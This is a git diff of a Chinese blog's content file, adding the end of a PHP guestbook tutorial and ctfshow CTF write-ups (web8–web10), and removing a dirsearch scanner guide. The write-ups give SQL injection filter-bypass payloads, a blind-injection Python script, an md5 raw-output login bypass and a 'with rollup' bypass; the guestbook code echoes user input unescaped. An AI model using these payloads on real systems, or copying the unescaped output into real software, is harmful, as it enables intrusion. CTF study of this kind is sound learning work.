+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//设置时区</span><br><span class="line">date_default_timezone_set(&#x27;PRC&#x27;);</span><br><span class="line">//读了内容</span><br><span class="line">@$string = file_get_contents(&#x27;message.txt&#x27;);</span><br><span class="line">//如果$string 不为空的时候执行，也就是message.txt中有留言数据</span><br><span class="line">if (!empty($string)) &#123;</span><br><span class="line">    //每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉</span><br><span class="line">    $string = rtrim($string, &#x27;&amp;^&#x27;);</span><br><span class="line">    //以&amp;^切成数组</span><br><span class="line">    $arr = explode(&#x27;&amp;^&#x27;, $string);</span><br><span class="line">    //将留言内容读取</span><br><span class="line">    foreach ($arr as $value) &#123;</span><br><span class="line">        //将用户名和内容分开</span><br><span class="line">        list($username, $content, $time) = explode(&#x27;$#&#x27;, $value);</span><br><span class="line">        echo &#x27;用户名为&lt;font color=&quot;gree&quot;&gt;&#x27; . $username . &#x27;&lt;/font&gt;内容为&lt;font color=&quot;red&quot;&gt;&#x27; . $content . &#x27;&lt;/font&gt;时间为&#x27; . date(&#x27;Y-m-d H:i:s&#x27;, $time);</span><br><span class="line">        echo &#x27;&lt;hr /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h1&gt;基于文件的留言本演示&lt;/h1&gt;</span><br><span class="line">&lt;form action=&quot;write.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;</span><br><span class="line">    留言内容：&lt;textarea  name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看了刚刚的展示内容，我们知道文件存储时：<br>1、段与段之间进行了分割<br>2、内容与用户之前用一个特殊的符号进行了分割</p>
+<p>下面我们来写write.php写入留言至文件的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//追加方式打开文件</span><br><span class="line">$fp=fopen(&#x27;message.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">//设置时间</span><br><span class="line">$time=time();</span><br><span class="line">//得到用户名</span><br><span class="line">$username=trim($_POST[&#x27;username&#x27;]);</span><br><span class="line">//得到内容</span><br><span class="line">$content=trim($_POST[&#x27;content&#x27;]);</span><br><span class="line">//组合写入的字符串：内容和用户之间分开，使用$#</span><br><span class="line">//行与行之间分开，使用&amp;^</span><br><span class="line">$string=$username.&#x27;$#&#x27;.$content.&#x27;$#&#x27;.$time.&#x27;&amp;^&#x27;;</span><br><span class="line">//写入文件</span><br><span class="line">fwrite($fp,$string);</span><br><span class="line">//关闭文件</span><br><span class="line">fclose($fp);</span><br><span class="line">header(&#x27;location:index.php&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<br> <a href="https://www.runoob.com/php/php-tutorial.html">PHP 教程</a></p>
+]]></content>
+      <tags>
+        <tag>语言</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow</title>
     <url>/2023/08/17/ctfshow/</url>
     <content><![CDATA[<p>ctfshow</p>
@@ -3516,46 +3552,62 @@ tap
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3</span><br></pre></td></tr></table></figure>
 
 <p>成功获取flag</p>
-<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>根据上题过滤空格的经验，这一题也是一样过滤了空格，并且and、和union select都过滤了，那么只能考虑运用其他方法来注入了<br>过滤空格：可以使用&#x2F;**&#x2F;和%a0绕过<br>过滤联合查询语句：可以使用盲注替代联合注入<br>过滤逗号,：可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用 substr(database() from 1 for 1)来代替<br>过滤and：可以使用or</p>
+<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>提示是sql注入，第一步先试下 ’ or 1&#x3D;1# 提示sql注入错误</p>
+<p>第二步试下&#x2F;**&#x2F;替代空格，还是错误</p>
+<p>第三步，去掉’单引号，成功，说明过滤了单引号<br> 测试：<code>?id=1/**/or/**/1=1#</code></p>
+<p>回显全部</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>无回显</p>
+<p>考虑盲注</p>
+<p>查看有多少字段<code>1/**/or/**/1=1/**/union/**/select/**/1,2,3#</code>，但是这里又提示sql错误，这里可能过滤了select和union关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤空格：可以使用/**/和%a0绕过</span><br><span class="line">过滤联合查询语句：可以使用盲注替代联合注入</span><br><span class="line">过滤逗号,：可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用 substr(database() from 1 for 1)来代替</span><br><span class="line">过滤and：可以使用or</span><br><span class="line">过滤单引号：表名可以用十六进制来表示</span><br></pre></td></tr></table></figure>
+
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=&#x27;http://1a52462e-b3aa-4f50-8445-0792a199259e.chall.ctf.show/index.php&#x27;</span><br><span class="line">table=&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#x27; and ascii(substr((select database()),1,1))=xx #</span><br><span class="line">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span><br><span class="line"></span><br><span class="line">&#x27; and ascii(substr((select database())from 1 for 1))=xx #</span><br><span class="line">这应该是substring函数的两种用法</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,45):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(31,128):</span><br><span class="line">        #爆表名  flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #爆字段名 flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #读取flag</span><br><span class="line">        payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line"></span><br><span class="line">        if &#x27;I asked nothing&#x27; in ra:</span><br><span class="line">            table += chr(j)</span><br><span class="line">            print(table)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p> 进去以后就是一个登录界面, 盲猜是个SQL注入漏洞,行不通<br> 就觉得该换个思路</p>
+<p>那就扫描下目录吧,dirsearch扫出了一个robots.txt</p>
+<p>我们访问根目录下的 robots.txt 文件</p>
+<pre><code>robots.txt是一个文本文件,同时也是一个协议,规定了爬虫访问的规则( 哪些文件可以爬取,哪些文件不可以爬取)
+</code></pre>
+<p> 从robots.txt文件的内容中可以发现, 作者给了提示, index.phps文件应该就是此关卡的源码文件</p>
+<p> 然后就是访问这个地址给你一个下载链接我们直接打开得到</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">		$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">		if(strlen($password)&gt;10)&#123;</span><br><span class="line">			die(&quot;password error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						 echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">						 echo $flag;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 从源码中可以发现, SQL中使用了md5()函数加密, 我们可以利用MD5加密漏洞来绕过</p>
+<p>考验你的代码审计，如果php有没怎么学的建议恶补一下，学一下语法和php的数据库连接</p>
+<pre><code>$sql=&quot;select * from user where username =&#39;admin&#39; and password =&#39;&quot;.md5($password,true).&quot;&#39;&quot;;
+        $result=mysqli_query($con,$sql);
+            if(mysqli_num_rows($result)&gt;0)&#123;
+                while($row=mysqli_fetch_assoc($result))&#123;
+                         echo &quot;登陆成功&lt;br&gt;&quot;;
+                         echo $flag;
+</code></pre>
+<p>我们主要看这一块，那些mysqli什么的函数如果没用过直接上菜鸟搜函数的作用，下面的函数大概就是如果能成功访问到数据库获得那些行值就能执行while 那也就是说 r e s u l t 这 个 值 必 须 是 正 确 的 ， 那 我 们 就 来 看 看 result这个值必须是正确的， 那我们就来看看 result这个值必须是正确的，那我们就来看看result</p>
+<pre><code>$result=mysqli_query($con,$sql);
+</code></pre>
+<p>和 s q l 是 有 关 系 的 也 就 是 sql 是有关系的 也就是 sql是有关系的也就是sql的查询语句要是正确的，那我们接下来看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>username这一部分原网页里面就已经帮我填写了 那我们重点来看password这一块<br>首先了解一下md5这个函数后面有个参数默认是false返回32位的16进制数，而这里是true<br>菜鸟教程上给出的解释是TRUE - 原始 16 字符二进制格式 大致就是把你这一堆MD5值又弄成字符串了<br>大家想想前面值为真了,那这边如果是 or xxxxx的话不就是恒真了嘛。那就想想有什么字符输进去最后会转成 带 or 的，然后这里我就开始进行强大的搜索引擎了 最后找到篇博客 里面就是这道题，然后大佬给出了两个值一个是<br>129581926211651571912466741651878684928<br>另一个是<br>ffifdyop<br>那这样下次这样的题目如果判断全是数字就用上面，如果判断是字符就用下面</p>
+<p>这边因为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+<p>有限制长度</p>
+<p>所以在密码框中输入 ffifdyop, 即可登录成功, 获取flag</p>
+<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>和web9一样。先查看一下源码，<br> 右键查看源代码<br> 进入style.css<br> 发现有index.phps<br> 在url处输入后，查看源码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		$flag=&quot;&quot;;</span><br><span class="line">        function replaceSpecialChar($strParam)&#123;</span><br><span class="line">             $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</span><br><span class="line">             return preg_replace($regex,&quot;&quot;,$strParam);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						if($password==$row[&#x27;password&#x27;])&#123;</span><br><span class="line">							echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">							echo $flag;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现被过滤了这些东西select|from|where|join|sleep|and|\s|union|,<br>又被这个避免了双写绕过if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password))){ die(“sql inject error”);}</p>
+<p>定义了过滤函数，对username和password进行过滤，然后判断输入的password是否对应根据我们输入的username从数据库中查到的密码</p>
+<p>这时候，我们要用到group by和roll with<br>group by（将结果集中的数据行根据选择列的值进行逻辑分组）：<br>在使用group by以后会按照password中的值进行排列：<br>with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>此时我们发现，多出一行NULL，并且count（*）为统计和。<br>加入with rollup后 password有一行为NULL。<br>payload在用户名框中进行输入，密码框不输入，使其为空，满足 p a s s w o r d &#x3D; &#x3D; password&#x3D;&#x3D; password&#x3D;&#x3D;row[‘password’]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>ctf解题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dirsearch</title>
-    <url>/2023/08/15/dirsearch/</url>
-    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><span id="more"></span>
-
-<p>dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。</p>
-<p>相比其他扫描工具disearch的特点是：</p>
-<pre><code>支持HTTP代理
-多线程
-支持多种形式的网页（asp,php）
-生成报告（纯文本，JSON）
-启发式检测无效的网页
-递归扫描
-用户代理随机化
-批量处理
-扫描器与字典（注：字典必须是文本文件）
-</code></pre>
-<p>下载及安装<br> 要求:python 3.7或更高版本 </p>
-<pre><code>其中，db文件夹为自带字典文件夹；reports为扫描日志文件夹；dirsearch.py为主程序文件 
-</code></pre>
-<h1 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h1><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
-<p>目前版本是更新到0.42。</p>
-<h1 id="3-下载到本地，安装使用"><a href="#3-下载到本地，安装使用" class="headerlink" title="3.下载到本地，安装使用"></a>3.下载到本地，安装使用</h1><p>pip3 install -r requirements.txt     &#x2F;&#x2F;安装依赖包</p>
-<p>下载超时了，找国内镜像。如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
-
-<p>python3 setup.py install</p>
-<h1 id="4-使用命令"><a href="#4-使用命令" class="headerlink" title="4.使用命令"></a>4.使用命令</h1><p>常用命令<br>–version            显示dirsearch的版本<br>-h –help            帮助提示<br>-u  –url            指定网址<br>-e                   指定网站语言<br>-w                   指定字典<br>-r                   递归目录（跑出目录后，继续跑目录下面的目录）<br>-l  –url-list&#x3D;FILE  目标url文件路径<br>-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)<br>-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</p>
-<p>简单使用<br>&#x2F;&#x2F;简单的使用方法<br>python3 dirsearch.py -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;使用文件拓展名为php和txt以及js的字典扫描目标<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;采用指定路径的wordlist且拓展名为php，txt，js的字典扫描目标url<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -w &#x2F;path&#x2F;to&#x2F;wordlist<br>&#x2F;&#x2F;采用递归扫描<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r<br>&#x2F;&#x2F;采用递归扫描 递归层数为三层<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r -R 3</p>
-]]></content>
-      <tags>
-        <tag>安全工具</tag>
       </tags>
   </entry>
   <entry>
